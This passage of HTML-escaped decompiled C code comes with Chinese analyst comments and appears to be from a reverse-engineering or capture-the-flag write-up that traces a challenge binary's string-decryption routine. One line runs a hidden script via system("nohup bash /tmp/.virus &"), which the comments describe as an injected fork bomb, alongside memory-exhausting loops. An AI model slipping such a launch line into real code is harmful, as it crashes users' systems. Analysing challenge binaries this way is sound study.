&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;nohup bash /tmp/.virus &amp;amp;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;// 执行注入的sfork炸弹
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;signed&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;93&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;                                           &lt;span class=&#34;c1&#34;&gt;// 这个for是分配大量的内存和输出随机字符
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v13&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                                  &lt;span class=&#34;c1&#34;&gt;// 这个if判断最后一次的分配空间是否成功
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                                                &lt;span class=&#34;c1&#34;&gt;// 成功则开始解密
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;// 这里是正式解密代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;           &lt;span class=&#34;c1&#34;&gt;// switch的值在0-4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;patch1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                 &lt;span class=&#34;c1&#34;&gt;// 每次patch调用的形参位置都不一样
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                        &lt;span class=&#34;c1&#34;&gt;// 猜测每个case只执行一次。这样的话，就可以精简下代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;patch5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;					
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                        &lt;span class=&#34;c1&#34;&gt;// 这里的patch函数可以尝试进入函数体分析
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                                                &lt;span class=&#34;c1&#34;&gt;// 如果直接patch恶意代码就不做演示
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;patch9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;patch13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nf&#34;&gt;patch17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;LABEL_22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v11&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                                &lt;span class=&#34;c1&#34;&gt;// v11从0开始自加
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;                                &lt;span class=&#34;c1&#34;&gt;// v11超过4之后就goto跳出了循环
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;          &lt;span class=&#34;k&#34;&gt;goto&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LABEL_23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;LABEL_23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;j_strlen_ifunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v6&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unk_488424&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;what a pity!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFFFFFFFFLL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;j_strcat_ifunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                    &lt;span class=&#34;c1&#34;&gt;// strcat函数，可以看出拼接的字符串正好是case里面的内容
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nf&#34;&gt;j_strcat_ifunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;j_strcat_ifunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;j_strcat_ifunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;j_strcat_ifunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;putchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sc&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;putchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sc&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                                &lt;span class=&#34;c1&#34;&gt;// 吃掉无意间输入的字符
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v14&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                                    &lt;span class=&#34;c1&#34;&gt;// v14用strcat了5次
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getchar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;__readfsqword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x28u&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v25&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
